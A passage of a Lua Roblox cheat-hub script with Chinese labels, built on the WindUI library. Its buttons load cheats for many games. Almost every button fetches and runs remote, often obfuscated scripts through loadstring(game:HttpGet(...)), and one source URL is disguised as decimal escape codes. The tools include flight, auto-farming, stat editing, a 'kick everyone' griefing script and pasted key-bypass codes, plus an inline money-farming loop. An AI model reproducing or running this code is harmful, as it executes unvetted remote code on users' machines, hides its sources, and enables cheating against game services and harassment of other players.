            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "老外脚本2",
    Desc = "英文",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/4f5c7bbe546251d81e9d3554b109008f.lua"))()
        WindUI:Notify({
            Title = "已加载",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "Katchi Hub",
    Desc = "有飞行",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/716e6083239381ecd8b1f0591e383b2005a6fd5d87ede30645fac4f53e764d4a/download"))()
        WindUI:Notify({
            Title = "好用",
            Content = "极品",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "墨水脚本",
    Icon = "cookie",
    Locked = false,
})

local Tab = Window:Tab({
    Title = "脚本中心",
    Icon = "cloud-check",
    Locked = false,
})

local Button = Tab:Button({
    Title = "皮脚本",
    Desc = "中文",
    Locked = false,
    Callback = function()
      getgenv().XiaoPi="皮脚本QQ群1002100032" loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/main/QQ1002100032-Roblox-Pi-script.lua"))()  
        WindUI:Notify({
            Title = "无敌皮脚本",
            Content = "好用",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "kg",
    Desc = "kg",
    Locked = false,
    Callback = function()
        KG_SCRIPT = "张硕制作"
loadstring(game:HttpGet("https://github.com/ZS-NB/KG/raw/main/Zhang-Shuo.lua"))()
        WindUI:Notify({
            Title = "🤓",
            Content = "🤓",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "xk脚本",
    Desc = "中文",
    Locked = false,
    Callback = function()
      loadstring(game:HttpGet(('https://github.com/devslopo/DVES/raw/main/XK%20Hub')))()
        WindUI:Notify({
            Title = "无敌xk脚本",
            Content = "加载成功…",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "测试版",
    Desc = "皮脚本",
    Locked = false,
    Callback = function()
        getgenv().XiaoPi="皮脚本测试版QQ群1002100032" loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/main/PijiaobenV1.lua"))()
        WindUI:Notify({
            Title = "皮脚本",
            Content = "无敌",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "TX",
    Desc = "TX",
    Locked = false,
    Callback = function()
        TX = "脚本群:160369111"
Script = "Free永久免费"
loadstring(game:HttpGet("https://raw.githubusercontent.com/JsYb666/TX-Free-YYDS/refs/heads/main/FREE-TX-TEAM"))()
        WindUI:Notify({
            Title = "TX",
            Content = "TX",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "战争大亨",
    Icon = "shield-check",
    Locked = false,
})

local Button = Tab:Button({
    Title = "战争大亨",
    Desc = "汉化",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/liuliuqiang404-code/-/refs/heads/main/%E6%88%98%E4%BA%89%E5%A4%A7%E4%BA%A8%E6%B1%89%E5%8C%96"))()
        WindUI:Notify({
            Title = "刘某汉化",
            Content = "无敌",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "跟上面的一样",
    Desc = "但是kenny汉化",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/%E6%88%98%E4%BA%89%E5%A4%A7%E4%BA%A8.txt"))()
        WindUI:Notify({
            Title = "好用",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "偷走脑红",
    Icon = "flame",
    Locked = false,
})

local Button = Tab:Button({
    Title = "偷走脑红脚本",
    Desc = "",
    Locked = false,
    Callback = function()
        -- 复制卡密到剪贴板
        local cardKey = "Arbix hub" -- 替换为实际的卡密
        if setclipboard then
            setclipboard(cardKey)
        end
        
        -- 执行原有脚本
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Youifpg/Steal-a-Brianrot/refs/heads/main/ArbixHubBEST.lua"))()    
        
        WindUI:Notify({
            Title = "已加载",
            Content = "卡密已自动复制到剪贴板",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "隐身脚本",
    Desc = "还没试过，不知道有没有用",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://pastefy.app/o9mKKAda/raw"))()
        WindUI:Notify({
            Title = "已加载",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "偷走脑红",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://pastefy.app/ULdWe37N/raw"))()
        WindUI:Notify({
            Title = "已加载",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "偷走脑红",
    Desc = "要解卡",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/onliengamerop/Steal-a-brainrot/refs/heads/main/Protected_3771863424757750.lua.txt"))()
        WindUI:Notify({
            Title = "有防🐔打",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "自然灾害",
    Icon = "cloud-off",
    Locked = false,
})

local Button = Tab:Button({
    Title = "自然灾害",
    Desc = "无敌少侠飞",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Invinicible-Flight-R15-45414"))()
        WindUI:Notify({
            Title = "好玩",
            Content = "刘某",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "防坠落",
    Desc = "刘某",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/liuliuqiang404-code/-/refs/heads/main/%E9%98%B2%E5%9D%A0%E8%90%BD2"))()
        WindUI:Notify({
            Title = "好用",
            Content = "可以",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "[🔥UPD]滑动",
    Icon = "bomb",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "脚本一",
    Desc = "卡密会自动复制到剪切板",
    Locked = false,
    Callback = function()
        -- 复制卡密到剪贴板
        local cardKey = "AuriFlick" -- 替换为实际的卡密
        if setclipboard then
            setclipboard(cardKey)
        end
        
        -- 执行原有脚本
 
loadstring(game:HttpGet("https://pastefy.app/Ov9X5NsM/raw"))() 
        
        WindUI:Notify({
            Title = "已加载",
            Content = "卡密已自动复制到剪贴板",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "刀锋球",
    Icon = "volleyball",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "刀锋球",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet("https://raw.githubusercontent.com/adulterar/BladeBallFpsBooster/refs/heads/main/Unlock-FPS"))()
        WindUI:Notify({
            Title = "加载成功",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "收养我吧",
    Icon = "baby",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "脚本一",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet("https://gist.githubusercontent.com/madmaxv3/c0776e55af28d7a846daac05b73bdcdc/raw/b70b01497da3fc747f46e6a1b19e7e04ebcfb619/v78.17.lua"))()
        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "脚本二",
    Desc = "老外无卡密脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet("https://gist.githubusercontent.com/madmaxv3/d47e0f6b5d7473b70926718fff21919f/raw/b70b01497da3fc747f46e6a1b19e7e04ebcfb619/v10.30.lua"))()
        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "脚本三",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet("https://gist.githubusercontent.com/madmaxv3/a67d4d9189755b356542cdac970d4222/raw/b70b01497da3fc747f46e6a1b19e7e04ebcfb619/v70.59.lua"))()
        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "脚本四",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet("https://gist.githubusercontent.com/madmaxv3/b116b6230a77f3a8032d4e2c34b82831/raw/b70b01497da3fc747f46e6a1b19e7e04ebcfb619/v98.27.lua"))()
        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "脚本五",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet("https://gist.githubusercontent.com/madmaxv3/37d5987cca29d00808aa06fcc84fabbe/raw/b70b01497da3fc747f46e6a1b19e7e04ebcfb619/v53.71.lua"))()
        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "13号航站楼：非人类 [恐怖]",
    Icon = "person-standing",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "脚本一",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet("https://pastefy.app/qcHi3xbp/raw"))()
        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "逃离脑残海啸！",
    Icon = "brain",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "脚本一",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/6dd28c30d711ef63838e1343e9ff2d8a89a8072f9057fcb05855946ff51170aa/download"))()
        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "脚本二",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
      loadstring(game:HttpGet("https://pastefy.app/DuYsJry7/raw"))()
        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "[更新] 监狱生活",
    Icon = "columns-4",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "脚本一",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/6dd28c30d711ef63838e1343e9ff2d8a89a8072f9057fcb05855946ff51170aa/download"))()
        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "动漫卡片收藏",
    Icon = "card-sim",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "脚本一",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet('https://raw.githubusercontent.com/amazinggold69/Anime-Card-Collection/main/Anime-Card-Collection.lua'))()
        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "【更新】你VS荷马",
    Icon = "youtube",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "脚本一",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet('https://raw.githubusercontent.com/akinotaxehappyshot/You-VS-Homer/main/You-VS-Homer.lua'))()
        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "起床战争",
    Icon = "bed",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "脚本一",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet('https://raw.githubusercontent.com/ellsworth6349/BedWars-4cje/main/BedWars.lua'))()

        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "BlockSpin 🔪",
    Icon = "slice",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "脚本一",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet('https://raw.githubusercontent.com/icepowerelk882/BlockSpin/main/BlockSpin.lua'))()

        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "封禁或被封禁🔨",
    Icon = "hammer",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "脚本一",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet("https://pastebin.com/raw/kE51jbD8", true))()
        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "【更新】排球传奇",
    Icon = "volleyball",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "脚本一",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet('https://raw.githubusercontent.com/tintsergo/Volleyball-Legends/main/Volleyball-Legends.lua'))()

        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "【更新】被遗弃者",
    Icon = "speech",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "脚本一",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet('https://raw.githubusercontent.com/asedynook45/Forsaken/main/Forsaken.lua'))()

        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "脚本二",
    Desc = "虚空汉化脚本",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/hdjsjjdgrhj/script-hub/refs/heads/main/%E8%A2%AB%E9%81%97%E5%BC%83"))()
        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "脚本三",
    Desc = "不知道什么脚本",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/ivannetta/ShitScripts/refs/heads/main/forsaken.lua")))()
        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "捕捉并驯服！",
    Icon = "cctv",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "脚本一",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet('https://raw.githubusercontent.com/eddykotuk8/Catch-And-Tame/main/Catch-And-Tame.lua'))()

        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "【更新】⛏️打破幸运方块！",
    Icon = "gavel",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "脚本一",
    Desc = "老外脚本",
    Locked = false,
    Callback = function()
 
loadstring(game:HttpGet('https://raw.githubusercontent.com/mrrip1287/Break-a-Lucky-Block/main/Break-a-Lucky-Block.lua'))()

        WindUI:Notify({
            Title = "已加载",
            Content = "加载完成",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "力量传奇",
    Icon = "biceps-flexed",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "修改数据",
    Desc = "修改力量或敏捷",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/jynzl/main/main/Musclas%20Legenos.lua'))()
        WindUI:Notify({
            Title = "快用别修复了",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "速度脚本",
    Desc = "没用过",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Blox-Fruits-Speed-Hub-X-24115"))()
        WindUI:Notify({
            Title = "没用过",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "力量传奇自动锻炼",
    Desc = "别人汉化的",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/lmlmlm7891/cnmsjwnrnmbdsmdx/refs/heads/main/obfuscated_script-1770183396306.lua.txt"))()
        WindUI:Notify({
            Title = "已汉化",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "最强战场",
    Icon = "cctv",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "老外脚本一",
    Desc = "请搭配API汉化",
    Locked = false,
    Callback = function()
        -- 复制卡密到剪贴板
        local cardKey = "qb7HLcqv2o5rdNzpeFbY" -- 替换为实际的卡密
        if setclipboard then
            setclipboard(cardKey)
        end
        
        -- 执行原有脚本
        loadstring(game:HttpGet("https://raw.githubusercontent.com/needanewphone32-eng/tsbfiles/refs/heads/main/Main1.lua"))()
        
        WindUI:Notify({
            Title = "已加载",
            Content = "卡密已自动复制到剪贴板",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "老外脚本二",
    Desc = "搭配API汉化",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Mautiku/ehh/main/strong%20guest.lua.txt'))()
        WindUI:Notify({
            Title = "不知道",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "压力",
    Icon = "heart-pulse",
    Locked = false,
    Opened = true,
})

local Section = Tab:Section({ 
    Title = "我没用过不知道怎么样",
    TextXAlignment = "Center",
    TextSize = 17
})

local Button = Tab:Button({
    Title = "脚本一",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://github.com/DocYogurt/Main/raw/main/Scripts/Pressure"))()
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "脚本二",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\81\105\110\103\45\89\117\110\45\68\101\118\47\83\99\114\105\112\116\115\47\77\97\105\110\47\76\111\97\100\101\114\46\108\117\97"))()
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "白脚本",
    Desc = "",
    Locked = false,
    Callback = function()
         loadstring(game:HttpGet("https://github.com/Drop56796/CreepyEyeHub/blob/main/obfuscate.lua?raw=true"))()
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "微山",
    Desc = "",
    Locked = false,
    Callback = function()
        link = loadstring(game:HttpGet("https://github.com/Drop56796/CreepyEyeHub/blob/main/obfuscate.lua?raw=true"))()
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "人机.压力",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://github.com/DocYogurt/Main/raw/main/Scripts/Pressure?raw=true"))()
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "不知道",
    Desc = "",
    Locked = false,
    Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/3345-c-a-t-s-u-s/New-C4-Remote.lua/main/pressure_kuy.lua"))()
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "伐木大亨2",
    Icon = "axe",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "脚本一",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/DevKron/Kron_Hub/refs/heads/main/version_1.0'))("")
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "脚本二",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/frencaliber/LuaWareLoader.lw/main/luawareloader.wtf",true))()
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "战争机器",
    Icon = "swords",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "刷钱",
    Desc = "",
    Locked = false,
    Callback = function()
getgenv().WarMachinesExecuted = not getgenv().WarMachinesExecuted
getgenv().TweenTeleportTakenTime = 0.5
getgenv().Return = false
getgenv().AutoCooldown = true

if getgenv().WarMachinesExecuted then
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(500, 700, 265)
    task.wait(0.1)
    game:GetService('VirtualInputManager'):SendKeyEvent(true, Enum.KeyCode.Space, false, game)
    task.wait(0.1)
    game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.Space, false, game)
    task.wait(0.1)
    game:GetService('VirtualInputManager'):SendKeyEvent(true, Enum.KeyCode.Space, false, game)
    task.wait(0.1)
    game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.Space, false, game)
    task.wait(0.1)
    game:GetService('VirtualInputManager'):SendKeyEvent(true, Enum.KeyCode.LeftShift, false, game)
    task.wait(0.0001)
    game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.LeftShift, false, game)
    getgenv().PlrVelocity = Instance.new("BodyVelocity")
    getgenv().PlrVelocity.Parent = game.Workspace.Characters[game.Players.LocalPlayer.Name].LowerTorso
    getgenv().PlrVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    Loops = 0
    Direction = 1
    while true do
        if not getgenv().WarMachinesExecuted then
            break
        end
        Loops = Loops + 1
        if Loops == 40 and getgenv().Return == true then
            Direction = Direction * -1
            Loops = 0
        else
            getgenv().PlrVelocity.Velocity = Vector3.new(0, 1250 * Direction, 0)
            task.wait(0.5)
        end
		getgenv().PlrVelocity.Velocity = Vector3.new(0,100,0)
		if game.Players.LocalPlayer.Character:GetAttribute("Overheat") ~= nil then
        	if getgenv().AutoCooldown and game.Players.LocalPlayer.Character:GetAttribute("Overheat") >= 900 then
        	    repeat
        	        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-830.82, 285, -509.22)
        	        if game.Players.LocalPlayer.PlayerGui.Client.SideBar.Visible == true and game.Players.LocalPlayer.PlayerGui.Hotbar.Enabled == true then
        	            game:GetService('VirtualInputManager'):SendKeyEvent(true, Enum.KeyCode.Space, false, game)
        	            task.wait(0.1)
        	            game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.Space, false, game)
        	            task.wait(0.1)
        	            if game.Players.LocalPlayer.PlayerGui.Client.SideBar.Visible == true and game.Players.LocalPlayer.PlayerGui.Hotbar.Enabled == true then
        	                game:GetService('VirtualInputManager'):SendKeyEvent(true, Enum.KeyCode.LeftShift, false, game)
        	                task.wait(0.0001)
        	                game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.LeftShift, false, game)
        	                task.wait(0.1)
        	                if game.Players.LocalPlayer.PlayerGui.Client.SideBar.Visible == true and game.Players.LocalPlayer.PlayerGui.Hotbar.Enabled == true then
        	                    game:GetService('VirtualInputManager'):SendKeyEvent(true, Enum.KeyCode.Space, false, game)
        	                    task.wait(0.1)
        	                    game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.Space, false, game)
        	                    task.wait(0.1)
        	                    game:GetService('VirtualInputManager'):SendKeyEvent(true, Enum.KeyCode.LeftShift, false, game)
        	                    task.wait(0.0001)
        	                    game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.LeftShift, false, game)
        	                    task.wait(0.1)
        	                end
        	            end
        	        end
        	        task.wait(0.01)
        	    until game.Players.LocalPlayer.Character:GetAttribute("Overheat") <= 50 or not getgenv().WarMachinesExecuted
        	end
		end
        if game.Players.LocalPlayer.PlayerGui.Client.SideBar.Visible == true and game.Players.LocalPlayer.PlayerGui.Hotbar.Enabled == true then
            game:GetService('VirtualInputManager'):SendKeyEvent(true, Enum.KeyCode.Space, false, game)
            task.wait(0.1)
            game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.Space, false, game)
            task.wait(0.1)
            if game.Players.LocalPlayer.PlayerGui.Client.SideBar.Visible == true and game.Players.LocalPlayer.PlayerGui.Hotbar.Enabled == true then
                game:GetService('VirtualInputManager'):SendKeyEvent(true, Enum.KeyCode.LeftShift, false, game)
                task.wait(0.0001)
                game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.LeftShift, false, game)
                task.wait(0.1)
                if game.Players.LocalPlayer.PlayerGui.Client.SideBar.Visible == true and game.Players.LocalPlayer.PlayerGui.Hotbar.Enabled == true then
                    game:GetService('VirtualInputManager'):SendKeyEvent(true, Enum.KeyCode.Space, false, game)
                    task.wait(0.1)
                    game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.Space, false, game)
                    task.wait(0.1)
                    game:GetService('VirtualInputManager'):SendKeyEvent(true, Enum.KeyCode.LeftShift, false, game)
                    task.wait(0.0001)
                    game:GetService('VirtualInputManager'):SendKeyEvent(false, Enum.KeyCode.LeftShift, false, game)
                end
            end
        end
    end
else
    getgenv().PlrVelocity.Velocity = Vector3.new(0,0,0)
    game:GetService("TweenService"):Create(game.Players.LocalPlayer.Character.HumanoidRootPart ,TweenInfo.new(getgenv().TweenTeleportTakenTime),{CFrame = CFrame.new(500, 700, 265)}):Play()
    task.wait(getgenv().TweenTeleportTakenTime)
    getgenv().PlrVelocity:Destroy()
	game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,-10,0)
	task.wait(.25)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(500, 640, 265)
end
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "刷钱二",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/mortalbaba/warmachinesscript/main/loader.lua"))()
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "ohio",
    Icon = "crown",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "脚本一",
    Desc = "",
    Locked = false,
    Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/DH-NB-666/Dan_Huang_-_-_-_-_-_-_-_-_-_-_-_-_-_NB666/main/danhuang----____----____----____----____----____----____----____----____--------____----____--------____----____----____.lua", true))() 
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "XA",
    Desc = "",
    Locked = false,
    Callback = function()
        getgenv().XiaoPi="XA脚本"loadstring(game:HttpGet("https://raw.githubusercontent.com/Xingtaiduan/Script/refs/heads/main/Games/Ohio"))()
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "TETRAX",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Ohio.-TETRAX-22744"))()
        WindUI:Notify({
            Title = "",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "综合区",
    Icon = "skull",
    Locked = false,
})

local Button = Tab:Button({
    Title = "神秘",
    Desc = "神秘",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fake-lag-41217"))()
        WindUI:Notify({
            Title = "笑死他们",
            Content = "跑慢点",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "反击",
    Desc = "踢出所有人",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/liuliuqiang404-code/-/refs/heads/main/%E8%B8%A2%E4%BA%BA"))()
        WindUI:Notify({
            Title = "猛攻",
            Content = "刘某",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "机甲变身",
    Desc = "机甲变身",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/liuliuqiang404-code/-/refs/heads/main/%E8%87%AA%E6%9D%80"))()
        WindUI:Notify({
            Title = "机甲变身",
            Content = "横扫千军",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "Dex",
    Desc = "汉化",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://gitee.com/cmbhbh/cmbh/raw/master/Bex.lua"))()
        WindUI:Notify({
            Title = "dex",
            Content = "dex",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "别点",
